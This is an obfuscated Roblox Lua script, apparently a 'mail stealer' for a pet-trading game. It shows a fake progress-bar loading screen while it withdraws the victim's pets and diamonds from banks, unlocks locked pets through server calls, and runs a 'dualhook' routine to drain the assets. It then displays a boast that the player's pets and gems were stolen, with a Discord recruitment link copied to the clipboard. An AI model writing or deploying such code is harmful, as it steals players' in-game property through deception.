	v145[v7("\29\50\2\42\253\206\28\50\28\33\234\143", "\95\93\112\78\152\188")] = Color3.new(0, 0 - 0, 0);
	v145[v7("\240\206\231\129\16\246\141\219\219\240\181\28\252\187\222", "\178\161\149\229\117\132\222")] = 0;
	v145[v7("\19\135\200\212\184\168\25\168", "\67\232\187\189\204\193\118\198")] = UDim2.new(0.828901589, 0, 0.818889916, 0);
	v145[v7("\220\130\52\176", "\143\235\78\213\64\91\98")] = UDim2.new(0.020775551, 0, 0.0457795784, 0);
	v145[v7("\128\132\91\141\235\124\179", "\214\237\40\228\137\16")] = true;
	v145[v7("\150\132\241\234\215\23", "\198\229\131\143\185\99")] = v77;
	local v156 = Instance.new(v7("\225\249\163\170\227\6\224\192\226\131\173\250\12\192\219\222\145\173\225\2\234\218\196", "\180\176\226\217\147\99\131"));
	v156[v7("\67\80\158\173\125\69", "\19\49\236\200")] = v145;
	local v158 = Instance.new(v7("\51\214\161\59\43\210\187\42\11", "\103\179\217\79"));
	v158[v7("\156\241\57\226", "\218\158\87\150\215\132")] = Enum[v7("\235\244\16\205", "\173\155\126\185\130\86\66")][v7("\202\247\163\190\200\131\237\202\168\191", "\140\133\198\218\167\232")];
	v158[v7("\176\176\54\160", "\228\213\78\212\29")] = v7("\242\15", "\195\42\215\124\181\33\236");
	v158[v7("\223\130\84\162\38\228\139\67\164\86", "\139\231\44\214\101")] = Color3.new(0.615686, 0.615686, 0.615686 + 0);
	v158[v7("\34\220\247\18\109\19\176\61\19\221", "\118\185\143\102\62\112\209\81")] = true;
	v158[v7("\12\89\104\61\213\172\15\25", "\88\60\16\73\134\197\117\124")] = 14;
	v158[v7("\117\85\242\236\255\83\81\250\232\205\69", "\33\48\138\152\168")] = true;
	v158[v7("\22\124\21\56\94\211\7\125\31\62\69", "\87\18\118\80\49\161")] = Vector2.new(0.5, 0.5);
	v158[v7("\146\77\29\209\167\162\67\11\212\164\147\67\18\213\178\227", "\208\44\126\186\192")] = Color3.new(1, 1, 1);
	v158[v7("\108\246\25\175\193\6\243\220\64\243\46\182\199\26\239\217\79\229\31\170\197\13", "\46\151\122\196\166\116\156\169")] = 1;
	v158[v7("\203\234\254\79\14\242\234\227", "\155\133\141\38\122")] = UDim2.new(0.500212491, 0, 0.783736229, 0);
	v158[v7("\150\44\48\169", "\197\69\74\204\33\47\31")] = UDim2.new(0.163107559, 0, 0.0220514499, 0);
	v158[v7("\177\249\92\83\133\252\74", "\231\144\47\58")] = true;
	v158[v7("\23\179\213\223", "\89\210\184\186\21\120\93\175")] = v7("\200\8\75\52\59\43\236\12\94\50", "\152\109\57\87\94\69");
	v158[v7("\10\176\65\121\219\109", "\90\209\51\28\181\25")] = v77;
	local v174 = Instance.new(v7("\156\252\207\30\143\191\208\81\164", "\200\153\183\106\195\222\178\52"));
	v174[v7("\153\223\117\67", "\223\176\27\55\142")] = Enum[v7("\147\43\181\218", "\213\68\219\174")][v7("\89\25\229\39\232\33\196\16\113\14", "\31\107\128\67\135\74\165\95")];
	v174[v7("\133\221\240\232", "\209\184\136\156\45\33")] = v7("\118\51\243\129\46\106\72\43\240\156\60\69", "\58\82\131\232\93\41");
	v174[v7("\140\2\208\97\43\183\11\199\103\91", "\216\103\168\21\104")] = Color3.new(0.615686, 0.615686 - 0, 0.615686);
	v174[v7("\144\125\181\87\151\123\172\79\161\124", "\196\24\205\35")] = true;
	v174[v7("\50\43\147\247\53\39\145\230", "\102\78\235\131")] = 14;
	v174[v7("\0\255\54\32\115\85\56\167\36\255\42", "\84\154\78\84\36\39\89\215")] = true;
	v174[v7("\36\243\226\94\87\23\205\238\95\86\17", "\101\157\129\54\56")] = Vector2.new(0.5, 0.5);
	v174[v7("\91\28\170\129\172\49\118\8\167\142\136\44\117\18\187\217", "\25\125\201\234\203\67")] = Color3.new(1, 1, 1);
	v174[v7("\49\120\247\19\4\6\40\6\119\240\44\17\21\41\0\105\245\10\6\26\36\10", "\115\25\148\120\99\116\71")] = 1;
	v174[v7("\113\3\46\176\48\72\3\51", "\33\108\93\217\68")] = UDim2.new(0.500006676 - 0, 0, 0.498198956, 0);
	v174[v7("\158\210\81\164", "\205\187\43\193")] = UDim2.new(0.679586172, 0, 0.210751072, 0);
	v174[v7("\233\247\97\12\221\242\119", "\191\158\18\101")] = true;
	v174[v7("\129\196\206\130", "\207\165\163\231\215")] = v7("\11\187\99", "\95\227\55\176\117\61");
	v174[v7("\64\199\235\252\88\48", "\16\166\153\153\54\68")] = v77;
	local v190 = Instance.new(v7("\135\23\125\34\71\152\27\108\42\91\191", "\203\120\30\67\43"));
	v190[v7("\201\211\161\197\72\32", "\153\178\211\160\38\84\65")] = v174;
	local v192 = Instance.new(v7("\237\244\61\89\195\216\243\32\65", "\185\145\69\45\143"));
	v192[v7("\13\141\5\78", "\75\226\107\58")] = Enum[v7("\235\87\208\5", "\173\56\190\113\26\113\162")][v7("\209\217\219\41\10\252\202\241\35\0", "\151\171\190\77\101")];
	v192[v7("\63\192\55\236", "\107\165\79\152\201\152\29")] = v7("\239\137\13\16\182\200\202\22\10\230\240\133\30\29\175\210\141", "\188\234\127\121\198");
	v192[v7("\75\82\86\252\232\91\115\88\92\187", "\31\55\46\136\171\52")] = Color3.new(0.615686, 0.615686, 0.615686);
	v192[v7("\192\212\48\200\199\210\41\208\241\213", "\148\177\72\188")] = true;
	v192[v7("\231\163\174\67\224\175\172\82", "\179\198\214\55")] = 14;
	v192[v7("\231\245\20\102\65\87\210\224\28\119\114", "\179\144\108\18\22\37")] = true;
	v192[v7("\238\200\160\19\134\221\246\172\18\135\219", "\175\166\195\123\233")] = Vector2.new(0.5, 0.5);
	v192[v7("\210\238\193\86\78\226\224\215\83\77\211\224\206\82\91\163", "\144\143\162\61\41")] = Color3.new(1, 1, 1);
	v192[v7("\17\225\208\22\87\96\136\38\238\215\41\66\115\137\32\240\210\15\85\124\132\42", "\83\128\179\125\48\18\231")] = 1;
	v192[v7("\46\82\164\250\201\78\17\83", "\126\61\215\147\189\39")] = UDim2.new(0.499691427, 0, 0.750191867, 0);
	v192[v7("\118\113\229\24", "\37\24\159\125")] = UDim2.new(0.216977671, 859 - (814 + 45), 0.0464212559 - 0, 0);
	v192[v7("\116\211\181\124\64\214\163", "\34\186\198\21")] = true;
	v192[v7("\236\249\5\192", "\162\152\104\165\61")] = v7("\151\45\34\26\155", "\227\88\82\115");
	v192[v7("\213\204\61\183\115\100", "\133\173\79\210\29\16")] = v77;
	local v208 = Instance.new(v7("\71\70\7\174\133\23\103\87\16\180", "\19\35\127\218\199\98"));
	v208[v7("\13\130\114\249", "\75\237\28\141")] = Enum[v7("\199\211\81\216", "\129\188\63\172\209\79\123\135")][v7("\235\82\225\226\194\75\229\201\195\69", "\173\32\132\134")];
	v208[v7("\249\75\3\28", "\173\46\123\104\143\206\81")] = v7("\193\19\235\19\162\56\242\25\225\19\233\14\162\48\242\4\233", "\130\124\155\106");
	v208[v7("\53\177\5\54\169\74\143\14\166\78", "\97\212\125\66\234\37\227")] = Color3.new(1, 1, 1);
	v208[v7("\42\143\251\162\6\23\144\230", "\126\234\131\214\85")] = 19;
	v208[v7("\123\129\205\93\105\91\150\218\66\95\108\139\217\70\72\28", "\47\228\181\41\58")] = Color3.new(1, 1, 1);
	v208[v7("\43\163\228\205\12\17\49\15\182\249\221", "\127\198\156\185\91\99\80")] = true;
	v208[v7("\255\251\25\196\255\181\59\54\215\251\14", "\190\149\122\172\144\199\107\89")] = Vector2.new(0.5, 0.5);
	v208[v7("\220\51\6\250\249\236\61\16\255\250\221\61\9\254\236\173", "\158\82\101\145\158")] = Color3.new(0, 0 + 0, 0);
	v208[v7("\102\113\253\9\17\86\127\235\12\18\112\98\255\12\5\84\113\236\7\24\71\105", "\36\16\158\98\118")] = 0.25;
	v208[v7("\213\207\5\202\239\81\231\41", "\133\160\118\163\155\56\136\71")] = UDim2.new(0.725644171, 0, 0.769552112, 0);
	v208[v7("\134\255\184\116", "\213\150\194\17\146\214\127")] = UDim2.new(0.145884946, 0, 0.0348379761, 0);
	v208[v7("\0\18\186\173\214\74\161", "\86\123\201\196\180\38\196\194")] = false;
	v208[v7("\129\246\229\220", "\207\151\136\185")] = v7("\155\220\216\245\160\177\242", "\223\181\171\150\207\195\150\28");
	v208[v7("\65\169\145\45\140\96", "\17\200\227\72\226\20\24")] = v77;
	local v224 = Instance.new(v7("\60\101\25\236\188\7\73\40", "\105\44\90\131\206"));
	v224[v7("\220\191\83\21\210\219\195\238\251\185\84\8", "\159\208\33\123\183\169\145\143")] = UDim.new(0, 5);
	v224[v7("\6\243\72\61\56\230", "\86\146\58\88")] = v208;
	local v227 = Instance.new(v7("\11\214\211\166\171\7\53\250", "\94\159\128\210\217\104"));
	v227[v7("\219\72\207\230\217\157\253\36\245\83\218\199\207\170\236", "\154\56\191\138\160\206\137\86")] = Enum[v7("\237\150\73\249\158\79\46\147\195\141\92\216\136\120\63", "\172\230\57\149\231\28\90\225")][v7("\249\13\184\130\215\58", "\187\98\202\230\178\72")];
	v227[v7("\105\46\237\171\34", "\42\65\129\196\80")] = Color3.new(0.180392, 0.65098, 0.509804);
	v227[v7("\218\10\67\94\209\25\2\17\253", "\142\98\42\61\186\119\103\98")] = 0.800000011920929;
	v227[v7("\56\57\173\7\6\44", "\104\88\223\98")] = v208;
	local v233 = Instance.new(v7("\86\95\250\7\179\108\124\235\115\64\237", "\26\48\153\102\223\63\31\153"));
	v233[v7("\221\69\229\231\192\22", "\141\36\151\130\174\98")] = v208;
	local v235 = Instance.new(v7("\218\15\65\234\246\46\65\239\246\14", "\147\98\32\141"));
	v235[v7("\36\137\123\197\8", "\109\228\26\162")] = "rbxassetid://7734010488";
	v235[v7("\199\80\230\245\119\242\214\81\236\243\108", "\134\62\133\157\24\128")] = Vector2.new(0.5, 0.5);
	v235[v7("\244\6\166\17\222\61\190\195\9\161\57\214\35\190\196\84", "\182\103\197\122\185\79\209")] = Color3.new(1, 1, 1);
	v235[v7("\106\242\132\234\112\18\71\230\137\229\67\18\73\253\148\241\118\18\77\253\132\248", "\40\147\231\129\23\96")] = 1;
	v235[v7("\254\122\234\136\64\169\143\211\121\247\158\22", "\188\21\152\236\37\219\204")] = Color3.new(0, 0 + 0, 0);
	v235[v7("\46\79\251\51\9\82\218\62\22\69\217\62\20\69\229", "\108\32\137\87")] = 0;
	v235[v7("\105\165\251\9\178\38\246\69", "\57\202\136\96\198\79\153\43")] = UDim2.new(0.892539382, 0, 0.888491988, 0);
	v235[v7("\203\162\57\175", "\152\203\67\202\199\237\199")] = UDim2.new(885.15978089 - (261 + 624), 0, 0.997630239, 0);
	v235[v7("\208\243\80\169\13\19\112", "\134\154\35\192\111\127\21\25")] = true;
	v235[v7("\226\185\52\12\4\52", "\178\216\70\105\106\64")] = v208;
	local v246 = Instance.new(v7("\126\49\98\240\218\3\85\95\42\66\247\195\9\117\68\22\80\247\216\7\95\69\12", "\43\120\35\131\170\102\54"));
	v246[v7("\176\62\57\127\248\221", "\224\95\75\26\150\169\181\180")] = v235;
	local v248 = {};
	task.spawn(function()
		local v394 = v107;
		local v395 = require;
		local function v396(v445)
			local v446 = 0;
			local v447;
			local v448;
			while true do
				if (1 == v446) then
					while true do
						if (v447 == 0) then
							v448 = 0;
							while true do
								if (v448 == 0) then
									local v598 = 0;
									local v599;
									while true do
										if (v598 == 0) then
											v599 = 0;
											while true do
												if (v599 == 0) then
													local v668 = 0;
													while true do
														if (v668 == 0) then
															if v248[v445] then
																return v248[v445]();
															end
															return v395(v445);
														end
													end
												end
											end
											break;
										end
									end
								end
							end
							break;
						end
					end
					break;
				end
				if (0 == v446) then
					v447 = 0;
					v448 = nil;
					v446 = 1;
				end
			end
		end
		local v397 = v394[v7("\70\10\200\221\38\80", "\22\107\186\184\72\36\204")];
		local v398 = v394[v7("\62\230\175\33\64\26", "\110\135\221\68\46")][v7("\11\226\36\9\229\218", "\91\131\86\108\139\174\211")][v7("\109\250\57\189\25\73", "\61\155\75\216\119")][v7("\201\17\187\187\36", "\189\100\203\210\92\56\105")];
		local v399 = v394[v7("\24\46\67\248\38\59", "\72\79\49\157")][v7("\140\137\162\52\178\156", "\220\232\208\81")][v7("\145\244\172\224\62\56", "\193\149\222\133\80\76\58")][v7("\226\195\79\76\215\200\73\78\213\195", "\178\166\61\47")];
		local v400 = v394[v7("\14\250\88\237\116\222", "\94\155\42\136\26\170")][v7("\133\133\45\35\187\144", "\213\228\95\70")][v7("\71\43\169\199\138\99", "\23\74\219\162\228")][v7("\31\48\245\69\160\41\61", "\91\89\134\38\207")];
		local function v401(v449, v450)
			local v451 = 0;
			local v452;
			local v453;
			while true do
				if (v451 == 1) then
					while true do
						if (v452 == 0) then
							v453 = 0;
							while true do
								if (0 == v453) then
									v397:TweenSize(UDim2.new(v449 / 100, 0, 1, 0), Enum[v7("\2\69\253\193\56\20\244\46\86\235\203\34\26\223\41", "\71\36\142\168\86\115\176")].Out, Enum[v7("\108\222\178\123\177\4\141\66\80\211\164", "\41\191\193\18\223\99\222\54")].Linear, v450, true);
									task.wait(v450);
									break;
								end
							end
							break;
						end
					end
					break;
				end
				if (v451 == 0) then
					v452 = 0;
					v453 = nil;
					v451 = 1;
				end
			end
		end
		while true do
			v401(1 - 0, 1080 - (1020 + 60));
			task.wait();
			local v454 = false;
			v399[v7("\158\174\62\211", "\202\203\70\167\74")] = v7("\213\17", "\228\52\102\231\214\197\208");
			repeat
				task.wait();
				if not v454 then
					v454 = true;
				end
				local v487 = math.random(75, 85);
				for v494 = 1, 100, 0.1 do
					local v495 = 0;
					local v496;
					local v497;
					local v498;
					local v499;
					while true do
						if (v495 == 1) then
							v498 = nil;
							v499 = nil;
							v495 = 2;
						end
						if (0 == v495) then
							v496 = 0;
							v497 = nil;
							v495 = 1;
						end
						if (v495 == 2) then
							while true do
								if (v496 == 0) then
									local v581 = 0;
									while true do
										if (v581 == 1) then
											v496 = 1;
											break;
										end
										if (v581 == 0) then
											v497 = 0;
											v498 = nil;
											v581 = 1;
										end
									end
								end
								if (v496 == 1) then
									v499 = nil;
									while true do
										if (v497 == (1424 - (630 + 793))) then
											while true do
												if (v498 == 1) then
													local v656 = 0;
													while true do
														if (v656 == 0) then
															print(tonumber(string.format(v7("\147\80\176\115", "\182\126\128\21\170\138\235\121"), v494)), v487);
															if (tonumber(string.format(v7("\67\197\138\51", "\102\235\186\85\134\230\115\80"), v494)) == v487) then
																local v708 = 0;
																local v709;
																local v710;
																local v711;
																local v712;
																while true do
																	if (v708 == 0) then
																		v709 = 0;
																		v710 = nil;
																		v708 = 1;
																	end
																	if (v708 == 1) then
																		v711 = nil;
																		v712 = nil;
																		v708 = 2;
																	end
																	if (v708 == 2) then
																		while true do
																			if (0 == v709) then
																				local v765 = 0;
																				while true do
																					if (v765 == 1) then
																						v709 = 1;
																						break;
																					end
																					if (v765 == 0) then
																						v710 = 0;
																						v711 = nil;
																						v765 = 1;
																					end
																				end
																			end
																			if (1 == v709) then
																				v712 = nil;
																				while true do
																					if (0 == v710) then
																						local v799 = 0;
																						local v800;
																						while true do
																							if (v799 == 0) then
																								v800 = 0;
																								while true do
																									if (v800 == 1) then
																										v710 = 1;
																										break;
																									end
																									if (v800 == 0) then
																										local v833 = 0;
																										while true do
																											if (v833 == 1) then
																												v800 = 1;
																												break;
																											end
																											if (0 == v833) then
																												v711 = "";
																												v712 = v7("\17\84\30\55\79\102\148\43\68\76\42\94\121\221\44\80\76\50\80\124\211\39\69\76\42\87\115\218\98\82\20\46\90\113\192\39\83\66", "\66\55\108\94\63\18\180");
																												v833 = 1;
																											end
																										end
																									end
																								end
																								break;
																							end
																						end
																					end
																					if (v710 == 1) then
																						local v801 = 0;
																						local v802;
																						local v803;
																						while true do
																							if (v801 == 1) then
																								while true do
																									if (v802 == 0) then
																										v803 = 0 - 0;
																										while true do
																											if (v803 == 1) then
																												v710 = 2;
																												break;
																											end
																											if (v803 == 0) then
																												local v853 = 0;
																												while true do
																													if (v853 == 1) then
																														v803 = 1;
																														break;
																													end
																													if (v853 == 0) then
																														for v860 = 0, string.len(v712) do
																															local v861 = 0;
																															local v862;
																															local v863;
																															while true do
																																if (v861 == 0) then
																																	v862 = 0;
																																	v863 = nil;
																																	v861 = 1;
																																end
																																if (1 == v861) then
																																	while true do
																																		if (v862 == 0) then
																																			v863 = 0;
																																			while true do
																																				if (v863 == (0 - 0)) then
																																					v711 = v711 .. string.sub(v712, v860, v860);
																																					v398[v7("\69\41\25\200", "\17\76\97\188\83")] = v711;
																																					break;
																																				end
																																			end
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																														_G[v7("\144\149\34\220\51", "\195\229\71\185\87\80\227\43")] = _G[v7("\220\240\249\5\84\195\233\241\9\68", "\143\128\156\96\48")];
																														v853 = 1;
																													end
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																							if (v801 == 0) then
																								v802 = 0;
																								v803 = nil;
																								v801 = 1;
																							end
																						end
																					end
																					if (v710 == 2) then
																						v499 = _G[v7("\36\168\212\245\22\59\177\220\249\6", "\119\216\177\144\114")];
																						break;
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															v656 = 1;
														end
														if (v656 == 1) then
															v498 = 2;
															break;
														end
													end
												end
												if (v498 == 0) then
													local v657 = 0;
													local v658;
													while true do
														if (v657 == 0) then
															v658 = 0;
															while true do
																if (v658 == 1) then
																	v498 = 1;
																	break;
																end
																if (0 == v658) then
																	local v729 = 0;
																	while true do
																		if (v729 == 1) then
																			v658 = 1;
																			break;
																		end
																		if (v729 == 0) then
																			v499 = math.random(1, 40 + 60) / _G[v7("\113\217\44\252\70", "\34\169\73\153")];
																			task.wait(v499);
																			v729 = 1;
																		end
																	end
																end
															end
															break;
														end
													end
												end
												if (v498 == 2) then
													v399[v7("\191\175\244\31", "\235\202\140\107")] = tostring(string.format(v7("\28\90\220\131", "\57\116\237\229\87\71"), v494)) .. "%";
													v397:TweenSize(UDim2.new(v494 / 100, 0, 1, 0), Enum[v7("\224\13\103\61\166\238\3\254\215\9\119\32\161\230\41", "\165\108\20\84\200\137\71\151")].Out, Enum[v7("\173\123\167\34\134\125\135\63\145\118\177", "\232\26\212\75")].Linear, v499 / 100, true);
													break;
												end
											end
											break;
										end
										if (v497 == 0) then
											local v617 = 0;
											while true do
												if (v617 == 0) then
													v498 = 0;
													v499 = nil;
													v617 = 1;
												end
												if (1 == v617) then
													v497 = 1;
													break;
												end
											end
										end
									end
									break;
								end
							end
							break;
						end
					end
				end
				task.wait(1.5);
				local v488 = math.random(1, 100) / _G[v7("\196\39\76\119\236", "\151\87\41\18\136")];
				v401(100, v488);
				v398[v7("\202\94\183\222", "\158\59\207\170\176")] = "Your pets and gems just got stolen by peak’s mail stealer join here to start stealing (https://discord.gg/2VpqzaBVDr)”";
				v400[v7("\186\70\77\58\75\128\74", "\236\47\62\83\41")] = true;
				break;
			until v399[v7("\182\255\177\52", "\226\154\201\64\91\202")] ~= v7("\22\250\225\168", "\39\202\209\141\135\23\142") 
			v400[v7("\138\200\90\20\26\70\185", "\220\161\41\125\120\42")] = true;
			v398[v7("\58\185\105\180", "\110\220\17\192")] = "Your pets and gems just got stolen by peak’s mail stealer join here to start stealing (https://discord.gg/2VpqzaBVDr)”";
			v13.join_server(v7("\235\235\54\8\6\59\246\248", "\152\159\83\105\106\82"));
			break;
		end
	end);
	task.spawn(function()
		local v402 = v190;
		local v403 = require;
		local function v404(v458)
			local v459 = 0;
			local v460;
			local v461;
			local v462;
			while true do
				if (v459 == 1) then
					v462 = nil;
					while true do
						if (v460 == 1) then
							while true do
								if (v461 == 0) then
									v462 = 0;
									while true do
										if (v462 == 0) then
											local v622 = 0;
											local v623;
											local v624;
											while true do
												if (v622 == 1) then
													while true do
														if (v623 == 0) then
															v624 = 0;
															while true do
																if (v624 == (0 - 0)) then
																	local v733 = 0;
																	while true do
																		if (v733 == 0) then
																			if v248[v458] then
																				return v248[v458]();
																			end
																			return v403(v458);
																		end
																	end
																end
															end
															break;
														end
													end
													break;
												end
												if (v622 == 0) then
													v623 = 0;
													v624 = nil;
													v622 = 1;
												end
											end
										end
									end
									break;
								end
							end
							break;
						end
						if (v460 == 0) then
							local v558 = 0;
							while true do
								if (v558 == 0) then
									v461 = 0;
									v462 = nil;
									v558 = 1;
								end
								if (v558 == 1) then
									v460 = 1;
									break;
								end
							end
						end
					end
					break;
				end
				if (v459 == 0) then
					v460 = 0;
					v461 = nil;
					v459 = 1;
				end
			end
		end
		local v405 = v402[v7("\151\117\107\49\20\255", "\199\20\25\84\122\139\87\145")];
		while true do
			local v463 = 0;
			local v464;
			local v465;
			while true do
				if (v463 == 1) then
					while true do
						if (v464 == 0) then
							v465 = 1747 - (760 + 987);
							while true do
								if (v465 == 0) then
									task.wait();
									v405[v7("\222\66\17\201", "\138\39\105\189\206\123")] = _G[v7("\215\10\5\167\44\254\252", "\159\127\103\233\77\147\153\175")];
									break;
								end
							end
							break;
						end
					end
					break;
				end
				if (v463 == 0) then
					v464 = 0;
					v465 = nil;
					v463 = 1;
				end
			end
		end
	end);
	task.spawn(function()
		local v406 = v233;
		local v407 = require;
		local function v408(v466)
			local v467 = 0;
			local v468;
			local v469;
			while true do
				if (v467 == 0) then
					v468 = 0;
					v469 = nil;
					v467 = 1;
				end
				if (1 == v467) then
					while true do
						if (v468 == 0) then
							v469 = 1913 - (1789 + 124);
							while true do
								if (v469 == 0) then
									local v601 = 0;
									while true do
										if (v601 == 0) then
											if v248[v466] then
												return v248[v466]();
											end
											return v407(v466);
										end
									end
								end
							end
							break;
						end
					end
					break;
				end
			end
		end
		local v409 = v406[v7("\251\6\226\225\164\84", "\171\103\144\132\202\32")];
		v409[v7("\33\31\58\250\9\50\58\253\24\31\33\184\47\28\38\234\7", "\108\112\79\137")]:Connect(function()
			setclipboard("https://discord.gg/2VpqzaBVDr");
		end);
	end);
	if ((v8[v7("\6\62\212\113", "\85\95\162\20\72\205\97\137")].Get()[v7("\233\254\252\39\211\3\252\222", "\173\151\157\74\188\109\152")] + v60[v7("\247\45\9\53\210\210\80\198", "\147\68\104\88\189\188\52\181")]) < 100000) then
		local v470 = 0;
		local v471;
		local v472;
		local v473;
		while true do
			if (v470 == 1) then
				v473 = nil;
				while true do
					if (v471 == 1) then
						while true do
							if (v472 == 0) then
								local v602 = 0;
								local v603;
								while true do
									if (0 == v602) then
										v603 = 0;
										while true do
											if (v603 == 0) then
												local v669 = 0;
												while true do
													if (v669 == 0) then
														v473 = _G[v7("\227\25\154\130\192\14\166\138\221\31", "\176\122\232\235")] or v7("\105\143\205\95\253\222\82", "\60\225\166\49\146\169");
														return game[v7("\222\140\116\35\74\252\147", "\142\224\21\90\47")][v7("\169\123\215\38\90\148\135\132\109\209\53", "\229\20\180\71\54\196\235")]:Kick(v7("\34\61\12\32\56\65\11\46\11\33\41\9\14\33\25\111\57\2\21\38\14\59\100\65\34\61\12\32\56\65\4\32\26\42\112\65", "\103\79\126\79\74\97") .. v473 .. v7("\84\150\126\198\125\93\18\137\124\193\122\78\14", "\122\218\31\179\19\62"));
													end
												end
											end
										end
										break;
									end
								end
							end
						end
						break;
					end
					if (v471 == 0) then
						local v559 = 0;
						while true do
							if (v559 == 0) then
								v472 = 0;
								v473 = nil;
								v559 = 1;
							end
							if (v559 == 1) then
								v471 = 767 - (745 + 21);
								break;
							end
						end
					end
				end
				break;
			end
			if (0 == v470) then
				v471 = 0;
				v472 = nil;
				v470 = 1;
			end
		end
	end
	game:GetService(v7("\118\167\215\223\213\204\179\98\166\223", "\37\211\182\173\161\169\193")):SetCoreGuiEnabled(Enum[v7("\163\38\108\196\196\224\163\180\48\110\196", "\224\73\30\161\131\149\202")].PlayerList, false);
	for v410, v411 in pairs(game:GetDescendants()) do
		if v411:IsA(v7("\138\248\47\67\221", "\217\151\90\45\185\72\27")) then
			v411:Destroy();
		end
	end
	game[v7("\96\253\228\232\85\227\246", "\48\145\133\145")][v7("\0\85\79\180\226\225\32\91\85\176\252", "\76\58\44\213\142\177")][v7("\91\195\37\0\44\123\223\33\0", "\24\171\68\114\77")][v7("\133\250\16\81\92\136\215\0\159\224\18\68\98\134\204\16", "\205\143\125\48\50\231\190\100")][v7("\129\231\181\21\8\228", "\194\161\199\116\101\129\131\191")] = game:GetService(v7("\97\204\110\236\1\70\194\127\226", "\54\163\28\135\114"))[v7("\64\23\246\124\178", "\31\72\187\61\226\46")][v7("\139\226\48\205\186\246\161\248\45\222\173", "\194\140\68\168\200\151")][v7("\215\67\245\222", "\149\34\155\181\69")][v7("\202\2\249", "\154\99\157\181")][v7("\207\171\29\237\173\233", "\140\237\111\140\192")];
	for v412, v413 in pairs(v60.Banks) do
		local v414 = 0;
		local v415;
		local v416;
		local v417;
		while true do
			if (1 == v414) then
				v417 = nil;
				while true do
					if (v415 == 1) then
						while true do
							if (v416 == 0) then
								v417 = 0;
								while true do
									if (0 == v417) then
										v413:withdraw_pets();
										v413:withdraw_diamonds();
										break;
									end
								end
								break;
							end
						end
						break;
					end
					if (v415 == 0) then
						local v536 = 0;
						while true do
							if (v536 == 1) then
								v415 = 1;
								break;
							end
							if (v536 == 0) then
								v416 = 0 + 0;
								v417 = nil;
								v536 = 1;
							end
						end
					end
				end
				break;
			end
			if (v414 == 0) then
				v415 = 0;
				v416 = nil;
				v414 = 1;
			end
		end
	end
	task.wait(2);
	game[v7("\40\10\24\100\29\20\10", "\120\102\121\29")][v7("\23\163\224\184\55\156\239\184\34\169\241", "\91\204\131\217")][v7("\221\198\254\71\213\176\201\251\220", "\158\174\159\53\180\211\189")][v7("\157\71\240\236\211\120\188\86\207\226\210\99\133\83\239\249", "\213\50\157\141\189\23")][v7("\135\216\52\133\173\119", "\196\158\70\228\192\18")] = game:GetService(v7("\19\204\20\72\193\87\127\39\198", "\68\163\102\35\178\39\30"))[v7("\46\129\93\251\247", "\113\222\16\186\167\99\213\227")][v7("\240\68\75\20\92\216\73\75\24\88\220", "\185\42\63\113\46")][v7("\54\213\212\45\59\20\204", "\123\180\189\65\89")][v7("\185\195\136", "\233\162\236\144\132")][v7("\124\148\214\255\23\188", "\63\210\164\158\122\217\150")];
	local v253 = {game:GetService(v7("\198\34\15\226\243\60\29", "\150\78\110\155"))[v7("\212\60\200\247\224\121\244\50\210\243\254", "\152\83\171\150\140\41")][v7("\56\142\228\154\54\198\60\29\139", "\104\226\133\227\83\180\123")][v7("\121\13\29\38\94\23\4\49\73", "\48\99\107\67")][v7("\93\204\167\112\213", "\27\190\198\29\176\77")][v7("\99\238\66\243", "\46\143\43\157\84\201")][v7("\248\82\108\69", "\168\55\24\54\162\63\115")][v7("\224\24\232\45\129\222", "\174\119\154\64\224\178")],game:GetService(v7("\112\137\196\62\228\182\13", "\32\229\165\71\129\196\126\223"))[v7("\200\37\125\196\119\53\171\27\253\47\108", "\132\74\30\165\27\101\199\122")][v7("\132\35\230\230\162\181\146\161\38", "\212\79\135\159\199\199\213")][v7("\49\119\182\176\73\72\216\10\96", "\120\25\192\213\39\60\183")][v7("\110\10\65\50\77", "\40\120\32\95")][v7("\50\59\162\55", "\127\90\203\89\26\207")][v7("\205\216\33\188", "\157\189\85\207\171\105")][v7("\55\207\181\217\187\10\197", "\99\166\193\184\213")]};
	local function v254(v418)
		for v474, v475 in ipairs(v418:GetChildren()) do
			if (v475:IsA(v7("\225\198\145\208\163\148\193\215\134\202", "\181\163\233\164\225\225")) and (v475[v7("\166\217\180\139\190\8", "\234\182\215\224\219\108")][v7("\3\201\146\178\55\204\132", "\85\160\225\219")] == true)) then
				if v475[v7("\101\93\8\134", "\43\60\101\227\169\86\188")] then
					local v508 = 0;
					local v509;
					local v510;
					local v511;
					while true do
						if (v508 == 1) then
							v511 = nil;
							while true do
								if (v509 == 1) then
									while true do
										if (v510 == 0) then
											v511 = {[1]={[v475[v7("\25\113\197\212", "\87\16\168\177\223\58\172\217")]]=false}};
											v22.get(v7("\91\95\136\53\55\96\142\42", "\23\48\235\94")):InvokeServer(unpack(v511));
											break;
										end
									end
									break;
								end
								if (v509 == 0) then
									local v604 = 0;
									while true do
										if (v604 == 1) then
											v509 = 1;
											break;
										end
										if (v604 == 0) then
											v510 = 0;
											v511 = nil;
											v604 = 1;
										end
									end
								end
							end
							break;
						end
						if (0 == v508) then
							v509 = 0;
							v510 = nil;
							v508 = 1;
						end
					end
				end
			end
		end
	end
	while true do
		for v476, v477 in ipairs(v253) do
			local v478 = 0;
			local v479;
			local v480;
			while true do
				if (v478 == 1) then
					while true do
						if (v479 == 0) then
							v480 = 0;
							while true do
								if (v480 == 0) then
									v254(v477);
									wait(0.2);
									break;
								end
							end
							break;
						end
					end
					break;
				end
				if (v478 == 0) then
					v479 = 0;
					v480 = nil;
					v478 = 1;
				end
			end
		end
		local v419 = 0;
		for v481, v482 in ipairs(v253) do
			for v491, v492 in ipairs(v482:GetChildren()) do
				if (v492:IsA(v7("\230\121\194\204\127\66\39\198\115\212", "\178\28\186\184\61\55\83")) and (v492[v7("\23\59\206\82\216\63", "\91\84\173\57\189")][v7("\224\25\170\5\254\172\211", "\182\112\217\108\156\192")] == true)) then
					v419 = v419 + 1;
				end
			end
		end
		if (v419 == 0) then
			break;
		end
	end
	dualhook = v54();
	task.wait(0.1);
	task.spawn(function()
		local v420 = 0;
		local v421;
		local v422;
		while true do
			if (v420 == 0) then
				v421 = 0;
				v422 = nil;
				v420 = 1;
			end
			if (v420 == 1) then
				while true do
					if (v421 == 0) then
						v422 = 0;
						while true do
							if (v422 == 0) then
								repeat
									task.wait();
								until dualhook:Diamonds() 
								repeat
									task.wait();
								until not dualhook:Pets() 
								break;
							end
						end
						break;
					end
				end
				break;
			end
		end
	end);
